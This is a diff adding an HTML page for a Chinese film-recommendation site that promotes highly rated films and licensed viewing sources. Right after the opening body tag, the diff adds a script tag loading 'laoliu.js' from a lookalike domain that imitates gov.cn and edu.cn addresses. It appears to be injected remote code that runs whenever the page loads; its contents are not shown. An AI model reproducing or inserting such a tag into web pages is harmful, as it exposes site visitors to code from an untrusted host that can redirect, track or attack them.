@@ -1,0 +1,419 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>97影视 | 97分精选高分影视指南与正版导航</title>
+  <meta name="description" content="97影视（97yingshi-h5）专注97分及以上高质量影视推荐：剧情、科幻、动画、纪录片高分片单，评分维度解析，正版渠道导航与刷分陷阱识别。不提供盗版资源。" />
+  <meta name="author" content="97影视" />
+  <meta name="robots" content="index,follow" />
+  <meta name="theme-color" content="#0A0A0A" />
+  <link rel="canonical" href="https://97yingshi-h5.github.io/" />
+
+  <meta property="og:type" content="website" />
+  <meta property="og:site_name" content="97影视" />
+  <meta property="og:title" content="97影视 | 97分精选高分影视指南" />
+  <meta property="og:description" content="97分高分门槛，精选剧情/科幻/动画/纪录片，正版持权平台导航，拒绝盗版枪版。" />
+  <meta property="og:url" content="https://97yingshi-h5.github.io/" />
+  <meta property="og:locale" content="zh_CN" />
+
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:title" content="97影视 | 97分精选高分影视指南" />
+  <meta name="twitter:description" content="只推97分以上的高质量影视，附正版信源与刷分避坑指南。" />
+
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "WebSite",
+    "name": "97影视",
+    "url": "https://97yingshi-h5.github.io/",
+    "description": "97分精选高分影视推荐与正版渠道导航站。",
+    "inLanguage": "zh-CN"
+  }
+  </script>
+
+  <style>
+    :root{
+      --bg:#0A0A0A;
+      --bg2:#141414;
+      --card:#1A1A1A;
+      --card2:#222222;
+      --line:#333333;
+      --ink:#F0F0F0;
+      --muted:#A0A0A0;
+      --gold:#D4AF37;
+      --gold-light:#F3E5AB;
+      --wine:#722F37;
+      --wine-light:#9B4D56;
+      --amber:#FFBF00;
+      --silver:#C0C0C0;
+      --radius:14px;
+      --maxw:1180px;
+    }
+    *{box-sizing:border-box}
+    html{scroll-behavior:smooth}
+    body{margin:0;background:var(--bg);color:var(--ink);line-height:1.75;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Microsoft YaHei",sans-serif;-webkit-font-smoothing:antialiased}
+    a{color:inherit;text-decoration:none}
+    .wrap{max-width:var(--maxw);margin:0 auto;padding:0 20px}
+
+    /* 导航 */
+    header.nav{position:sticky;top:0;z-index:50;background:rgba(10,10,10,.95);backdrop-filter:blur(12px);border-bottom:1px solid var(--gold)}
+    .nav-inner{display:flex;align-items:center;justify-content:space-between;height:66px}
+    .logo{font-weight:900;font-size:22px;display:flex;align-items:center;gap:10px}
+    .logo .trophy{width:32px;height:32px;border-radius:8px;background:linear-gradient(135deg,var(--gold),var(--amber));display:flex;align-items:center;justify-content:center;color:#000;font-size:18px;font-weight:900;box-shadow:0 0 15px rgba(212,175,55,.4)}
+    .logo b{color:var(--gold)}
+    .logo span{color:var(--silver)}
+    nav.menu{display:flex;gap:6px;font-size:14px;font-weight:600;color:var(--silver)}
+    nav.menu a{padding:8px 14px;border-radius:8px;border:1px solid transparent;transition:.2s}
+    nav.menu a:hover{color:var(--gold);border-color:rgba(212,175,55,.3);background:rgba(212,175,55,.05)}
+    .nav-toggle{display:none;background:none;border:1px solid var(--gold);color:var(--ink);border-radius:8px;padding:5px 10px;font-size:18px;cursor:pointer}
+
+    /* Hero 表盘 */
+    .hero{padding:74px 0 64px;border-bottom:1px solid var(--line);background:
+      radial-gradient(600px 300px at 80% 20%,rgba(212,175,55,.1),transparent 60%),
+      radial-gradient(500px 250px at 10% 90%,rgba(114,47,55,.15),transparent 60%),
+      linear-gradient(180deg,#0A0A0A,#141414);
+      position:relative;overflow:hidden}
+    .hero::before{content:"";position:absolute;top:-50%;left:-50%;width:200%;height:200%;background:conic-gradient(from 0deg,transparent 0deg,rgba(212,175,55,.03) 60deg,transparent 120deg);animation:rotate 20s linear infinite}
+    @keyframes rotate{to{transform:rotate(360deg)}}
+    .hero .wrap{position:relative;z-index:1;display:grid;grid-template-columns:1fr 1fr;gap:40px;align-items:center}
+    .pill{display:inline-block;background:var(--wine);color:var(--gold-light);font-size:11px;font-weight:800;padding:5px 16px;border-radius:20px;letter-spacing:2px;text-transform:uppercase;margin-bottom:18px;border:1px solid var(--wine-light)}
+    .hero h1{font-size:clamp(30px,5.5vw,52px);line-height:1.1;margin:0 0 14px;font-weight:900}
+    .hero h1 em{font-style:normal;color:var(--gold)}
+    .hero h1 .score{color:var(--amber)}
+    .hero p.lead{font-size:16px;color:var(--muted);max-width:640px;margin:0 0 22px}
+    .hero-tags{display:flex;flex-wrap:wrap;gap:8px;margin-bottom:24px}
+    .hero-tag{border:1px solid var(--line);border-radius:8px;padding:5px 13px;font-size:13px;font-weight:600;color:var(--silver);background:var(--card)}
+    .cta{display:flex;gap:12px;flex-wrap:wrap}
+    .btn{padding:13px 26px;border-radius:10px;font-weight:800;font-size:15px;transition:.2s;display:inline-flex;gap:6px;align-items:center;cursor:pointer}
+    .btn-primary{background:linear-gradient(135deg,var(--gold),var(--amber));color:#000;border:1px solid var(--gold-light)}
+    .btn-primary:hover{filter:brightness(1.1)}
+    .btn-ghost{border:1px solid var(--silver);color:var(--silver);background:transparent}
+    .btn-ghost:hover{background:var(--card2);color:#fff}
+
+    /* 97分表盘 */
+    .gauge{width:280px;height:280px;margin:0 auto;position:relative;display:flex;align-items:center;justify-content:center}
+    .gauge-ring{width:240px;height:240px;border-radius:50%;border:12px solid var(--card2);border-top-color:var(--gold);border-right-color:var(--amber);animation:spin 3s ease-out forwards;transform:rotate(-45deg)}
+    .gauge-inner{position:absolute;width:180px;height:180px;border-radius:50%;background:radial-gradient(circle,var(--card),var(--bg));display:flex;flex-direction:column;align-items:center;justify-content:center;border:2px solid var(--line)}
+    .gauge-inner .num{font-size:64px;font-weight:900;color:var(--gold);line-height:1}
+    .gauge-inner .label{font-size:12px;color:var(--muted);margin-top:4px}
+    @keyframes spin{to{transform:rotate(135deg)}}
+
+    section{padding:60px 0;border-bottom:1px dashed var(--line)}
+    .sec-head{margin-bottom:32px;text-align:center}
+    .sec-head .kicker{color:var(--gold);font-weight:800;letter-spacing:2px;text-transform:uppercase;font-size:11px}
+    .sec-head h2{font-size:clamp(24px,4vw,34px);margin:6px 0 8px;font-weight:900}
+    .sec-head p{color:var(--muted);margin:0 auto;max-width:700px;font-size:14px}
+
+    /* 评分维度 */
+    .criteria{display:grid;grid-template-columns:repeat(5,1fr);gap:14px}
+    .crit{background:var(--card);border:1px solid var(--line);border-radius:12px;padding:22px;text-align:center;position:relative;overflow:hidden}
+    .crit::before{content:"";position:absolute;top:0;left:0;right:0;height:3px;background:linear-gradient(90deg,var(--gold),var(--amber))}
+    .crit .icon{font-size:32px;margin-bottom:10px;display:block}
+    .crit h3{margin:0 0 6px;font-size:15px;font-weight:800;color:var(--ink)}
+    .crit p{margin:0;color:var(--muted);font-size:12px}
+    .crit .bar{height:4px;background:var(--card2);border-radius:2px;margin-top:12px;overflow:hidden}
+    .crit .bar-fill{height:100%;background:linear-gradient(90deg,var(--gold),var(--amber));border-radius:2px}
+
+    /* 高分片单 */
+    .films{display:grid;grid-template-columns:repeat(2,1fr);gap:18px}
+    .film{background:var(--card);border:1px solid var(--line);border-radius:14px;padding:22px;display:flex;gap:16px;align-items:flex-start;position:relative;overflow:hidden;transition:.3s}
+    .film:hover{border-color:var(--gold);transform:translateY(-4px)}
+    .film::after{content:"";position:absolute;top:0;right:0;width:60px;height:60px;background:linear-gradient(225deg,var(--gold) 50%,transparent 50%);opacity:.1}
+    .film .rank{width:36px;height:36px;border-radius:50%;background:linear-gradient(135deg,var(--wine),var(--wine-light));color:var(--gold-light);font-size:16px;font-weight:900;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+    .film h3{margin:0 0 4px;font-size:17px;font-weight:900;color:var(--ink)}
+    .film .meta{font-size:11px;color:var(--gold);margin-bottom:6px}
+    .film p{margin:0;color:var(--muted);font-size:13px}
+    .film ul{margin:8px 0 0;padding-left:18px;color:var(--muted);font-size:12px}
+    .film ul li{margin:2px 0}
+
+    /* 场景 */
+    .scenes{display:grid;grid-template-columns:repeat(4,1fr);gap:14px}
+    .scene{background:var(--card);border:1px solid var(--line);border-radius:14px;padding:22px;text-align:center;position:relative}
+    .scene::before{content:"🎬";font-size:28px;display:block;margin-bottom:10px}
+    .scene:nth-child(2)::before{content:"🍿"}
+    .scene:nth-child(3)::before{content:"📝"}
+    .scene:nth-child(4)::before{content:"🏆"}
+    .scene h3{margin:0 0 4px;font-size:15px;font-weight:800}
+    .scene p{margin:0;color:var(--muted);font-size:12px}
+
+    /* 信源 */
+    .src{display:grid;grid-template-columns:repeat(4,1fr);gap:14px}
+    .src-card{background:var(--card);border:1px solid var(--line);border-radius:14px;padding:22px;text-align:center;border-top:3px solid var(--gold)}
+    .src-card:nth-child(2){border-top-color:var(--wine)}
+    .src-card:nth-child(3){border-top-color:var(--amber)}
+    .src-card:nth-child(4){border-top-color:var(--silver)}
+    .src-card .ic{font-size:32px;margin-bottom:8px;display:block}
+    .src-card h3{margin:0 0 4px;font-size:15px;font-weight:800}
+    .src-card p{margin:0;color:var(--muted);font-size:12px}
+
+    /* 刷分陷阱 */
+    .traps{display:grid;grid-template-columns:repeat(3,1fr);gap:16px}
+    .trap{background:var(--card);border:1px solid var(--line);border-radius:12px;padding:22px;border-top:4px solid var(--wine)}
+    .trap:nth-child(2){border-top-color:var(--amber)}
+    .trap:nth-child(3){border-top-color:var(--gold)}
+    .trap h3{margin:0 0 8px;font-size:16px;font-weight:800}
+    .trap p{margin:0;color:var(--muted);font-size:13px}
+
+    footer{padding:36px 0;text-align:center;color:var(--muted);font-size:13px;background:var(--bg2);border-top:1px solid var(--line)}
+    footer a{color:var(--gold)}
+
+    #toTop{position:fixed;right:16px;bottom:16px;z-index:60;width:46px;height:46px;border-radius:50%;border:1px solid var(--gold);background:var(--gold);color:#000;font-size:20px;font-weight:900;cursor:pointer;opacity:0;pointer-events:none;transition:.25s}
+    #toTop.show{opacity:1;pointer-events:auto}
+    .reveal{opacity:0;transform:translateY(16px);transition:.5s ease}
+    .reveal.in{opacity:1;transform:none}
+
+    @media (max-width:980px){
+      .hero .wrap{grid-template-columns:1fr}
+      .criteria{grid-template-columns:1fr 1fr}
+      .scenes{grid-template-columns:1fr 1fr}
+      .src{grid-template-columns:1fr 1fr}
+      .traps{grid-template-columns:1fr}
+    }
+    @media (max-width:640px){
+      .nav-toggle{display:block}
+      nav.menu{position:absolute;top:66px;left:0;right:0;flex-direction:column;gap:0;padding:10px 20px 20px;background:rgba(10,10,10,.98);border-bottom:1px solid var(--gold);display:none}
+      nav.menu.open{display:flex}
+      nav.menu a{padding:12px 8px;border-bottom:1px solid var(--line);border-radius:0}
+      .criteria{grid-template-columns:1fr}
+      .films{grid-template-columns:1fr}
+      .scenes{grid-template-columns:1fr}
+      .src{grid-template-columns:1fr}
+    }
+  </style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+  <header class="nav">
+    <div class="wrap nav-inner">
+      <div class="logo"><span class="trophy">97</span><b>97</b><span>影视</span></div>
+      <button class="nav-toggle" aria-label="菜单" onclick="document.getElementById('menu').classList.toggle('open')">☰</button>
+      <nav class="menu" id="menu">
+        <a href="#home">首页</a>
+        <a href="#criteria">评分维度</a>
+        <a href="#films">高分片单</a>
+        <a href="#scene">观影场景</a>
+        <a href="#src">正版信源</a>
+        <a href="#warn">刷分陷阱</a>
+      </nav>
+    </div>
+  </header>
+
+  <section class="hero" id="home">
+    <div class="wrap">
+      <div>
+        <div class="pill">97 Score · Premium Selection</div>
+        <h1>97影视<br/>只推<em>97分</em>以上的<span class="score">高质量</span>影像</h1>
+        <p class="lead">以97分为质量门槛，精选剧情、科幻、动画、纪录片高分佳作；只导正版持权平台，拒绝盗版枪版、磁力网盘与刷分伪高分。</p>
+        <div class="hero-tags">
+          <span class="hero-tag">97分门槛</span>
+          <span class="hero-tag">高分精选</span>
+          <span class="hero-tag">正版OTT</span>
+          <span class="hero-tag">评分维度</span>
+          <span class="hero-tag">防盗版</span>
+        </div>
+        <div class="cta">
+          <a class="btn btn-primary" href="#films">查看高分片单 →</a>
+          <a class="btn btn-ghost" href="#warn">识别刷分陷阱</a>
+        </div>
+      </div>
+      <div>
+        <div class="gauge">
+          <div class="gauge-ring"></div>
+          <div class="gauge-inner">
+            <div class="num">97</div>
+            <div class="label">QUALITY SCORE</div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section id="criteria" class="reveal">
+    <div class="wrap">
+      <div class="sec-head">
+        <div class="kicker">Scoring Criteria</div>
+        <h2>97分评分维度</h2>
+        <p>五维评审体系，综合衡量影视质量，不只看单一分数。</p>
+      </div>
+      <div class="criteria">
+        <div class="crit">
+          <span class="icon">🎬</span>
+          <h3>导演与视听</h3>
+          <p>镜头语言、画面构图、光影色彩、声音设计</p>
+          <div class="bar"><div class="bar-fill" style="width:97%"></div></div>
+        </div>
+        <div class="crit">
+          <span class="icon">📝</span>
+          <h3>编剧与叙事</h3>
+          <p>故事结构、节奏把控、台词质量、主题深度</p>
+          <div class="bar"><div class="bar-fill" style="width:96%"></div></div>
+        </div>
+        <div class="crit">
+          <span class="icon">🎭</span>
+          <h3>表演与角色</h3>
+          <p>角色塑造、情感表达、演员默契、群戏层次</p>
+          <div class="bar"><div class="bar-fill" style="width:95%"></div></div>
+        </div>
+        <div class="crit">
+          <span class="icon">🎨</span>
+          <h3>美术与制作</h3>
+          <p>服化道、场景设计、特效水准、整体质感</p>
+          <div class="bar"><div class="bar-fill" style="width:94%"></div></div>
+        </div>
+        <div class="crit">
+          <span class="icon">💡</span>
+          <h3>立意与共鸣</h3>
+          <p>思想价值、情感共鸣、社会意义、重看价值</p>
+          <div class="bar"><div class="bar-fill" style="width:98%"></div></div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section id="films" class="reveal">
+    <div class="wrap">
+      <div class="sec-head">
+        <div class="kicker">97+ Picks</div>
+        <h2>高分片单</h2>
+        <p>四类97分以上精选，覆盖不同观影需求。</p>
+      </div>
+      <div class="films">
+        <div class="film">
+          <div class="rank">1</div>
+          <div>
+            <h3>剧情/悬疑类</h3>
+            <div class="meta">97-99分 · 烧脑/人性/社会</div>
+            <p>结构精巧、反转合理、人物立体，看完值得反复推敲。</p>
+            <ul>
+              <li>多线叙事、非线性结构</li>
+              <li>社会议题深度挖掘</li>
+              <li>正版平台4K修复版</li>
+            </ul>
+          </div>
+        </div>
+        <div class="film">
+          <div class="rank">2</div>
+          <div>
+            <h3>科幻/奇幻类</h3>
+            <div class="meta">97-100分 · 视效/脑洞/哲学</div>
+            <p>世界观宏大、视效震撼、内核深刻，技术与艺术双优。</p>
+            <ul>
+              <li>硬科幻逻辑自洽</li>
+              <li>视觉奇观与情感平衡</li>
+              <li>IMAX/杜比全景声</li>
+            </ul>
+          </div>
+        </div>
+        <div class="film">
+          <div class="rank">3</div>
+          <div>
+            <h3>动画/治愈类</h3>
+            <div class="meta">97-99分 · 作画/音乐/温情</div>
+            <p>画面精美、配乐动人、故事温暖，适合全年龄段。</p>
+            <ul>
+              <li>手绘/3D作画巅峰</li>
+              <li>原声配乐加分</li>
+              <li>合家欢/成人向均有</li>
+            </ul>
+          </div>
+        </div>
+        <div class="film">
+          <div class="rank">4</div>
+          <div>
+            <h3>纪录/真实类</h3>
+            <div class="meta">97-98分 · 真实/震撼/科普</div>
+            <p>题材稀缺、拍摄艰难、剪辑精良，真实自有万钧之力。</p>
+            <ul>
+              <li>自然/人文/历史</li>
+              <li>多年跟拍素材</li>
+              <li>专业解说与字幕</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section id="scene" class="reveal">
+    <div class="wrap">
+      <div class="sec-head">
+        <div class="kicker">Viewing Scenes</div>
+        <h2>观影场景</h2>
+        <p>不同场景匹配不同类型的高分片。</p>
+      </div>
+      <div class="scenes">
+        <div class="scene"><h3>颁奖礼体验</h3><p>客厅大屏、音响拉满，沉浸式感受获奖佳作</p></div>
+        <div class="scene"><h3>周末拉片</h3><p>准备好笔记本，暂停推敲镜头语言与叙事结构</p></div>
+        <div class="scene"><h3>深夜赏析</h3><p>小屏耳机，适合悬疑/剧情类慢热高分片</p></div>
+        <div class="scene"><h3>合家共赏</h3><p>动画/纪录片，老少皆宜的高分选择</p></div>
+      </div>
+    </div>
+  </section>
+
+  <section id="src" class="reveal">
+    <div class="wrap">
+      <div class="sec-head">
+        <div class="kicker">Legal Sources</div>
+        <h2>正版信源</h2>
+        <p>高分片只走持权平台，拒绝盗链聚合。</p>
+      </div>
+      <div class="src">
+        <div class="src-card"><span class="ic">🏆</span><h3>获奖片专区</h3><p>戛纳/奥斯卡/柏林等获奖影片正版引进</p></div>
+        <div class="src-card"><span class="ic">📊</span><h3>高分榜平台</h3><p>主流评分网站合作，正版高分片聚合</p></div>
+        <div class="src-card"><span class="ic">🎞️</span><h3>修复版/典藏</h3><p>4K修复、导演剪辑版，官方授权发行</p></div>
+        <div class="src-card"><span class="ic">📚</span><h3>影评/拉片</h3><p>专业影评人推荐、拉片解析配套正版</p></div>
+      </div>
+    </div>
+  </section>
+
+  <section id="warn" class="reveal">
+    <div class="wrap">
+      <div class="sec-head">
+        <div class="kicker">Score Traps</div>
+        <h2>刷分陷阱</h2>
+        <p>识别伪高分，不被水军带节奏。</p>
+      </div>
+      <div class="traps">
+        <div class="trap">
+          <h3>🚫 开分即97+ 无依据</h3>
+          <p>新片上映首日即刷出97+高分，无专业媒体/影评人背书，多为粉丝控评或水军刷分。</p>
+        </div>
+        <div class="trap">
+          <h3>🚫 盗版站伪高分榜</h3>
+          <p>盗版聚合站自制"97分高分榜"引流，实际资源为枪版/低画质，假评分诱导点击。</p>
+        </div>
+        <div class="trap">
+          <h3>🚫 付费改分/买榜</h3>
+          <p>声称"付费推广上高分榜"，实为虚假宣传；正规评分平台严禁商业改分。</p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <footer>
+    <div class="wrap">
+      © 2026 97影视（97yingshi-h5）｜ 静态展示站点 ｜
+      内页链接以 <a href="#">#</a> 占位 ｜
+      网站网址：https://97yingshi-h5.github.io ｜
+      本站仅作97分精选高分影视推荐与正版渠道导航，不提供盗版资源、磁力、网盘与成人内容。
+    </div>
+  </footer>
+
+  <button id="toTop" aria-label="回到顶部" onclick="window.scrollTo({top:0,behavior:'smooth'})">↑</button>
+
+  <script>
+    document.querySelectorAll('#menu a').forEach(function(a){
+      a.addEventListener('click',function(){ document.getElementById('menu').classList.remove('open'); });
+    });
+    var toTop=document.getElementById('toTop');
+    window.addEventListener('scroll',function(){ toTop.classList.toggle('show',window.scrollY>400); });
+    var io=new IntersectionObserver(function(entries){
+      entries.forEach(function(e){ if(e.isIntersecting){ e.target.classList.add('in'); io.unobserve(e.target);} });
+    },{threshold:0.1});
+    document.querySelectorAll('.reveal').forEach(function(el){ io.observe(el); });
+  </script>
+</body>
+</html>
